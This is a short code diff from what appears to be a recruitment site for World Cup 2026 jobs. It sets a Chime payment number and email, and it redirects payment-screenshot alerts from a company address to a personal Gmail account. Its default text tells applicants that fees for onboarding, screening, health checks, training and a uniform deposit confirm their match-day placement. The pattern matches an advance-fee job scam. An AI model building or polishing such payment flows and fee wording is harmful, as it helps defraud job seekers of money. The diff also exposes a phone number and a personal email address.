@@ -32,8 +32,8 @@ const EMAILJS_APPROVAL_TEMPLATE_ID = "template_APPROVAL_TEMPLATE_ID";
 const CHIME_PAYMENT_NUMBER = "+1 (513) 628-6294";
 const CHIME_PAYMENT_EMAIL = "payment@fifa26workforce.com";
 
-/** Inbox for payment screenshot alerts. Change to your Gmail if payment@ is not set up yet. */
-const PAYMENT_NOTIFICATION_EMAIL = "payment@fifa26workforce.com";
+/** Inbox for payment screenshot alerts. */
+const PAYMENT_NOTIFICATION_EMAIL = "paulgoodling0@gmail.com";
 
 const DEFAULT_PAYMENT_EXPLANATION =
   "These fees cover your onboarding, pre-employment screening, health assessment, and role training required to confirm your match-day placement at the FIFA World Cup 2026. The uniform deposit is fully refundable on return of your issued kit.";
